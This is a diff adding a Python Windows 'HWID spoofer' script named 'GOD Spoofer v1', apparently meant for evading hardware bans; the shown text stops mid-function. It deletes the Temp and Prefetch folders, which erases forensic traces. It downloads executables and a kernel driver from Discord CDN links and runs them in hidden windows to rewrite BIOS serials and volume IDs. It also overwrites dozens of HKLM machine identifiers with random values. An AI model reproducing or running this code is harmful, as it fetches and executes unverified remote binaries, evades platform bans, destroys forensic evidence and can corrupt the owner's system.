@@ -1,0 +1,1243 @@
+import os
+import requests
+import subprocess
+import winreg
+import random
+import string
+import time
+import colorama
+import ctypes
+import secrets
+import shutil
+title = "GOD Spoofer v1"
+ctypes.windll.kernel32.SetConsoleTitleW(title)
+
+#%temp%
+temp_folder = os.environ.get('TEMP')
+if temp_folder:
+    for root, dirs, files in os.walk(temp_folder):
+        for file in files:
+            try:
+                os.remove(os.path.join(root, file))
+            except (PermissionError, WindowsError):
+                pass
+        for dir in dirs:
+            try:
+                shutil.rmtree(os.path.join(root, dir))
+            except (PermissionError, WindowsError):
+                pass
+
+#temp
+temp_folder = 'temp'
+if os.path.exists(temp_folder):
+    for root, dirs, files in os.walk(temp_folder):
+        for file in files:
+            try:
+                os.remove(os.path.join(root, file))
+            except (PermissionError, WindowsError):
+                pass
+        for dir in dirs:
+            try:
+                shutil.rmtree(os.path.join(root, dir))
+            except (PermissionError, WindowsError):
+                pass
+
+#prefetch
+prefetch_folder = 'C:\\Windows\\Prefetch'
+if os.path.exists(prefetch_folder):
+    for file in os.listdir(prefetch_folder):
+        try:
+            os.remove(os.path.join(prefetch_folder, file))
+        except (PermissionError, WindowsError):
+            pass
+
+# Supprimer les fichiers et dossiers dans C:\Windows\Temp
+temp_win_folder = 'C:\\Windows\\Temp'
+if os.path.exists(temp_win_folder):
+    try:
+        shutil.rmtree(temp_win_folder)
+    except (PermissionError, WindowsError):
+        pass
+
+colorama.init()
+
+choix = input(colorama.Fore.WHITE + colorama.Style.BRIGHT + "Choose what you want \n \n" +
+colorama.Fore.BLUE + colorama.Style.BRIGHT + "[MADE BY K1NG#7564] \n \n" +
+colorama.Fore.RED + colorama.Style.BRIGHT + "[1] spoof (CLEAN BEFORE)\n \n" +
+colorama.Fore.GREEN + colorama.Style.BRIGHT + "[2] clean \n \n" +
+colorama.Fore.WHITE + colorama.Style.BRIGHT + "[3] exit \n \n \n" +
+colorama.Fore.WHITE + colorama.Style.BRIGHT + "> ")
+
+if choix == "1":
+    
+    BIOSReleaseDate = f"{str(random.randint(0, 28)).zfill(2)}/{str(random.randint(0, 12)).zfill(2)}/{random.randint(2016, 2022)}"
+    
+    os.system('cls')
+    
+    print(colorama.Fore.CYAN + colorama.Style.BRIGHT + "[-] Spoofing Hardware (can take 1 min)...")
+
+    file_path1 = os.path.expanduser("~") + "/AppData/Roaming/AMIDEWINx64.EXE"
+    file_path2 = os.path.expanduser("~") + "/AppData/Roaming/amifldrv64.sys"
+
+    if not os.path.exists(file_path1):
+        url = "https://cdn.discordapp.com/attachments/1000321583920988202/1063641962244227192/AMIDEWINx64.EXE"
+        response = requests.get(url)
+        with open(file_path1, "wb") as f:
+            f.write(response.content)
+
+    if not os.path.exists(file_path2):
+        url = "https://cdn.discordapp.com/attachments/1000321583920988202/1063642020893167696/amifldrv64.sys"
+        response = requests.get(url)
+        with open(file_path2, "wb") as f:
+            f.write(response.content)
+
+    CREATE_NO_WINDOW = 0x08000000
+
+    subprocess.Popen(f'"{file_path1}" /IVN {random.randint(10000000000000, 99999999999999)}', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.15)
+    subprocess.Popen(f'"{file_path1}" /IV {random.randint(10000000000000, 99999999999999)}', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.15)
+    subprocess.Popen(f'"{file_path1}" /SM {random.randint(10000000000000, 99999999999999)}', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.15)
+    subprocess.Popen(f'"{file_path1}" /SP {random.randint(1000000000000, 9999999999999)}', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.15)
+    subprocess.Popen(f'"{file_path1}" /SV {random.randint(100000000000000, 999999999999999)}', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.15)
+    subprocess.Popen(f'"{file_path1}" /SS {random.randint(1000000000000, 9999999999999)}', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.15)
+    subprocess.Popen(f'"{file_path1}" /SU auto', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.15)
+    subprocess.Popen(f'"{file_path1}" /SK {random.randint(100000000000000, 999999999999999)}', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.15)
+    subprocess.Popen(f'"{file_path1}" /SF {random.randint(100000000000000, 999999999999999)}', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.15)
+    subprocess.Popen(f'"{file_path1}" /BM {random.randint(10000000000000, 99999999999999)}', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.15)
+    subprocess.Popen(f'"{file_path1}" /BP {random.randint(10000000000000, 99999999999999)}', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.15)
+    subprocess.Popen(f'"{file_path1}" /BV {random.randint(100000000000, 999999999999)}', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.15)
+    subprocess.Popen(f'"{file_path1}" /BS {random.randint(100000000000000, 999999999999999)}', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.15)
+    subprocess.Popen(f'"{file_path1}" /BT {random.randint(100000000000, 999999999999)}', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.15)
+    subprocess.Popen(f'"{file_path1}" /BLC {random.randint(100000000000, 999999999999)}', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.15)
+    subprocess.Popen(f'"{file_path1}" /CM {random.randint(1000000000000, 9999999999999)}', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.15)
+    subprocess.Popen(f'"{file_path1}" /CT 0{random.randint(0, 9)}', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.15)
+    subprocess.Popen(f'"{file_path1}" /CV {random.randint(100000000000000, 999999999999999)}', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.15)
+    subprocess.Popen(f'"{file_path1}" /CS {random.randint(10000000000000, 99999999999999)}', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.15)
+    subprocess.Popen(f'"{file_path1}" /CA {random.randint(100000000000000, 999999999999999)}', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.15)
+    subprocess.Popen(f'"{file_path1}" /CSK {random.randint(100000000000000, 999999999999999)}', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.15)
+    subprocess.Popen(f'"{file_path1}" /PSN {random.randint(100000000000000, 999999999999999)}', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.15)
+    subprocess.Popen(f'"{file_path1}" /PAT {random.randint(100000000000000, 999999999999999)}', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.15)
+    subprocess.Popen(f'"{file_path1}" /PPN {random.randint(100000000000000, 999999999999999)}', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.15)
+    subprocess.Popen(f'"{file_path1}" /CO {random.randint(10000000, 99999999)}', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.3)
+    subprocess.Popen(f'"{file_path1}" /OS 1 "{random.randint(1000000000000, 9999999999999)}"', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.3)
+    subprocess.Popen(f'"{file_path1}" /OS 2 "{random.randint(1000000000000, 9999999999999)}"', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.3)
+    subprocess.Popen(f'"{file_path1}" /OS 3 "{random.randint(1000000000000, 9999999999999)}"', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.3)
+    subprocess.Popen(f'"{file_path1}" /OS 4 "{random.randint(1000000000000, 9999999999999)}"', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.3)
+    subprocess.Popen(f'"{file_path1}" /OS 5 "{random.randint(1000000000000, 9999999999999)}"', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.3)
+    subprocess.Popen(f'"{file_path1}" /OS 6 "{random.randint(1000000000000, 9999999999999)}"', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.3)
+    subprocess.Popen(f'"{file_path1}" /OS 7 "{random.randint(1000000000000, 9999999999999)}"', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.3)
+    subprocess.Popen(f'"{file_path1}" /OS 8 "{random.randint(1000000000000, 9999999999999)}"', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.3)
+    subprocess.Popen(f'"{file_path1}" /SCO 1 "{random.randint(1000000000000, 9999999999999)}"', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.3)
+    subprocess.Popen(f'"{file_path1}" /SCO 2 "{random.randint(1000000000000, 9999999999999)}"', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.3)
+    subprocess.Popen(f'"{file_path1}" /SCO 3 "{random.randint(1000000000000, 9999999999999)}"', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.3)
+    subprocess.Popen(f'"{file_path1}" /SCO 4 "{random.randint(1000000000000, 9999999999999)}"', creationflags=CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(0.3)
+    
+    os.system('cls')
+    print(colorama.Fore.CYAN + colorama.Style.BRIGHT + """[+] Hardware Spoofed !
+[-] Spoofing disk Drive...""")
+
+    file_path3 = "C:\\Volumeid.exe"
+    file_path4 = "C:\\Volumeid64.exe"
+
+    if not os.path.exists(file_path3):
+        url = "https://cdn.discordapp.com/attachments/1000321583920988202/1061258675601297428/Volumeid.exe"
+        response = requests.get(url)
+        open(file_path3, "wb").write(response.content)
+    
+    if not os.path.exists(file_path4):
+        url = "https://cdn.discordapp.com/attachments/1000321583920988202/1061258687349530624/Volumeid64.exe"
+        response = requests.get(url)
+        open(file_path4, "wb").write(response.content)
+    
+    command_vol = (f"cd c:\ & volumeid c: {random.randint(1000, 9999)}-{random.randint(1000, 9999)}")
+    
+    with open(os.devnull, 'w') as f:
+        subprocess.run(command_vol, shell=True, stdout=f, stderr=f)
+
+    time.sleep(random.randint(1, 5))
+    
+    os.system("cls")
+    
+    print(colorama.Fore.CYAN + colorama.Style.BRIGHT + """[+] Hardware Spoofed !
+[+] disk Drive Spoofed !
+[-] Spoofing Registery...""")
+    
+    ##variable
+    
+    BIOSReleaseDate = f"{str(random.randint(0, 28)).zfill(2)}/{str(random.randint(0, 12)).zfill(2)}/{random.randint(2016, 2022)}"
+    biosversion = f"{random.randint(10000000000000, 99999999999999)}"
+    
+    ##Logical Unit Id 0
+    
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+
+    def set_random_guid():
+
+        guid = "".join(" " * 8) + ''.join(random.choices(string.ascii_uppercase, k=4)) + ''.join(random.choices(string.digits, k=2)) + ''.join(random.choices(string.ascii_uppercase, k=8))
+
+        set_registry_value(r"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 1\Target Id 0\Logical Unit Id 0", "SerialNumber", guid)
+
+    set_random_guid()
+
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+
+    def set_random_guid():
+
+        guid = "".join(" " * 8) + ''.join(random.choices(string.ascii_uppercase, k=4)) + ''.join(random.choices(string.digits, k=2)) + ''.join(random.choices(string.ascii_uppercase, k=8))
+    
+        set_registry_value(r"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 1\Target Id 0\Logical Unit Id 0", "Identifier", guid)
+
+    set_random_guid()
+    
+    ##Cryptography
+    
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+
+    def set_random_guid():
+
+        guid = "-".join(["".join([random.choice(string.ascii_letters + string.digits) for _ in range(8)]) for _ in range(5)])
+
+        set_registry_value(r"SOFTWARE\Microsoft\Cryptography", "MachineGuid", guid)
+
+    set_random_guid()
+
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+
+    def set_random_guid():
+
+        guid = "-".join(["".join([random.choice(string.ascii_letters + string.digits) for _ in range(8)]) for _ in range(5)])
+    
+        set_registry_value(r"SOFTWARE\Microsoft\Cryptography", "GUID", guid)
+
+    set_random_guid()
+
+    ##HARDWARE\DESCRIPTION\System
+    
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+
+    def set_random_guid():
+
+        guid = f"{random.randint(10000000000000, 99999999999999)}"
+    
+        set_registry_value(r"HARDWARE\DESCRIPTION\System\BIOS", "BaseBoardManufacturer", guid)
+
+    set_random_guid()
+
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+
+    def set_random_guid():
+
+        guid = f"{random.randint(10000000000000, 99999999999999)}"
+    
+        set_registry_value(r"HARDWARE\DESCRIPTION\System\BIOS", "BaseBoardProduct", guid)
+
+    set_random_guid()
+
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+
+    def set_random_guid():
+
+        guid = f"{random.randint(100000000000, 999999999999)}"
+    
+        set_registry_value(r"HARDWARE\DESCRIPTION\System\BIOS", "BaseBoardVersion", guid)
+
+    set_random_guid()
+
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+
+    def set_random_guid():
+
+        guid = f"{random.randint(10000000000000, 99999999999999)}"
+    
+        set_registry_value(r"HARDWARE\DESCRIPTION\System\BIOS", "BIOSVendor", guid)
+
+    set_random_guid()
+
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+
+    def set_random_guid():
+
+        guid = f"{random.randint(100000000000000, 999999999999999)}"
+    
+        set_registry_value(r"HARDWARE\DESCRIPTION\System\BIOS", "SystemFamily", guid)
+
+    set_random_guid()
+
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+
+    def set_random_guid():
+
+        guid = f"{random.randint(100000000000000, 999999999999999)}"
+    
+        set_registry_value(r"HARDWARE\DESCRIPTION\System\BIOS", "SystemSKU", guid)
+
+    set_random_guid()
+
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+
+    def set_random_guid():
+
+        guid = f"{random.randint(100000000000000, 999999999999999)}"
+    
+        set_registry_value(r"HARDWARE\DESCRIPTION\System\BIOS", "SystemVersion", guid)
+
+    set_random_guid()
+
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+
+    def set_random_guid():
+
+        set_registry_value(r"HARDWARE\DESCRIPTION\System\BIOS", "BIOSReleaseDate", BIOSReleaseDate)
+
+    set_random_guid()
+    
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+
+    def set_random_guid():
+
+        set_registry_value(r"HARDWARE\DESCRIPTION\System\BIOS", "BIOSVersion", biosversion)
+    
+    set_random_guid()
+    
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+
+    def set_random_guid():
+
+        guid = f"{random.randint(10000000000000, 99999999999999)}"
+    
+        set_registry_value(r"HARDWARE\DESCRIPTION\System\BIOS", "SystemManufacturer", guid)
+
+    set_random_guid()
+    
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+
+    def set_random_guid():
+
+        guid = f"{random.randint(1000000000000, 9999999999999)}"
+    
+        set_registry_value(r"HARDWARE\DESCRIPTION\System\BIOS", "SystemProductName", guid)
+
+    set_random_guid() 
+    
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_MULTI_SZ, value)
+        except WindowsError:
+            pass
+
+    def set_random_guid():
+
+        set_registry_value(r"HARDWARE\DESCRIPTION\System", "SystemBiosVersion", [biosversion + '\0'])
+    
+    set_random_guid()
+    
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+
+    def set_random_guid():
+    
+        guid = f"{random.randint(10000000, 99999999)}-{random.randint(100000000, 999999999)}"
+        guid2 = f"{random.randint(10000000, 99999999)}-{random.randint(100000000, 999999999)}"
+    
+        set_registry_value(r"HARDWARE\DESCRIPTION\System\MultifunctionAdapter\0\DiskController\0\DiskPeripheral\0", "Identifier", guid)
+        set_registry_value(r"HARDWARE\DESCRIPTION\System\MultifunctionAdapter\0\DiskController\0\DiskPeripheral\1", "Identifier", guid2)
+    
+    set_random_guid()
+    
+    ##0001
+    
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+
+    def set_random_guid():
+
+        guid = f"{{{random.randint(10000, 99999)}-{random.randint(10000, 99999)}-{random.randint(10000, 99999)}-{random.randint(10000, 99999)}-{random.randint(10000, 99999)}}}"
+    
+        set_registry_value(r"SYSTEM\ControlSet001\Control\IDConfigDB\Hardware Profiles\0001", "GUID", guid)
+
+    set_random_guid()
+    
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+
+    def set_random_guid():
+
+        guid = f"{{{random.randint(10000, 99999)}-{random.randint(10000, 99999)}-{random.randint(10000, 99999)}-{random.randint(10000, 99999)}-{random.randint(1000, 9999)}}}"
+    
+        set_registry_value(r"SYSTEM\ControlSet001\Control\IDConfigDB\Hardware Profiles\0001", "HwProfileGuid", guid)
+
+    set_random_guid()
+    
+    def generate_random_string(length):
+        letters = string.ascii_letters + string.digits
+        result = ''.join(random.choice(letters) for i in range(length))
+        return result
+
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+
+    def set_random_guid():
+    
+        guid = generate_random_string(14)
+    
+        set_registry_value(r"SYSTEM\ControlSet001\Control\IDConfigDB\Hardware Profiles\0001", "FriendlyName", guid)
+    
+        set_registry_value(r"SYSTEM\ControlSet001\Control\IDConfigDB\Hardware Profiles\0000", "FriendlyName", guid)
+
+    set_random_guid()
+    
+    ##SQMClient
+    
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+    
+    def set_random_guid():
+
+        guid = f"{{{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}}}"
+    
+        set_registry_value(r"SOFTWARE\Microsoft\SQMClient", "MachineId", guid)
+
+    set_random_guid()
+
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_QWORD, value)
+        except WindowsError:
+            pass
+
+    def set_random_guid():
+        
+        guid = random.randint(100000000000, 999999999999)
+        
+        set_registry_value(r"SOFTWARE\Microsoft\SQMClient", "WinSqmFirstSessionStartTime", guid)
+
+    set_random_guid()
+    
+    ##Tcpip\Parameters
+    
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+    
+    def set_random_guid():
+
+        guid = f"{random.randint(10000000, 99999999)}"
+    
+        set_registry_value(r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters", "NV Hostname", guid)
+
+    set_random_guid()
+
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+    
+    def set_random_guid():
+
+        guid = f"{random.randint(10000000, 99999999)}"
+    
+        set_registry_value(r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters", "Hostname", guid)
+
+    set_random_guid()
+
+    def set_random_binary_value(key, value_name, length):
+    
+        binary_value = bytearray(secrets.randbits(8) for _ in range(length))
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, value_name, 0, winreg.REG_BINARY, binary_value)
+        except WindowsError:
+            pass
+
+    set_random_binary_value(r"SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters", "Dhcpv6DUID", length=14)
+    
+    ##ComputerName
+    
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+    
+    def set_random_guid():
+
+        guid = f"{random.randint(10000000, 99999999)}"
+    
+        set_registry_value(r"SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName", "ComputerName", guid)
+
+    set_random_guid()
+
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+    
+    def set_random_guid():
+
+        guid = f"{random.randint(10000000, 99999999)}"
+    
+        set_registry_value(r"SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName", "ComputerName", guid)
+
+    set_random_guid()
+
+    ##Windows NT
+    
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+    
+    def set_random_guid():
+
+        guid = f"{random.randint(100000000, 999999999)}"
+    
+        set_registry_value(r"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "RegisteredOwner", guid)
+
+    set_random_guid()
+    
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+    
+    def set_random_guid():
+
+        guid = f"{random.randint(100000000, 999999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
+    
+        set_registry_value(r"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "BuildGUID", guid)
+
+    set_random_guid()
+
+    def set_random_binary_value(key, value_name, length):
+        binary_value = bytearray(secrets.randbits(8) for _ in range(length))
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, value_name, 0, winreg.REG_BINARY, binary_value)
+        except WindowsError:
+            pass
+
+    set_random_binary_value(r"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "BuildGUIDEx", length=64)
+    
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+    
+    def set_random_guid():
+
+        guid = f"{random.randint(1000, 9999)}-.win7sp1_ldr.{random.randint(100000, 999999)}-{random.randint(1000, 9999)}"
+    
+        set_registry_value(r"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "BuildLab", guid)
+
+    set_random_guid()
+    
+    def set_registry_value(key, name, value):
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key, 0, winreg.KEY_SET_VALUE) as hkey:
+                winreg.SetValueEx(hkey, name, 0, winreg.REG_SZ, value)
+        except WindowsError:
+            pass
+    
+    def set_random_guid():
+
+        guid = f"{random.randint(10000, 99999)}.{random.randint(0, 9)}.amd64fre.vb_release.{random.randint(100000, 999999)}-{random.randint(1000, 9999)}"
+    
+        set_registry_value(r"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "BuildLabEx", guid)
+
+    set_random_guid()
+    
+    def set_registry_value(key, name, value):
+        try:
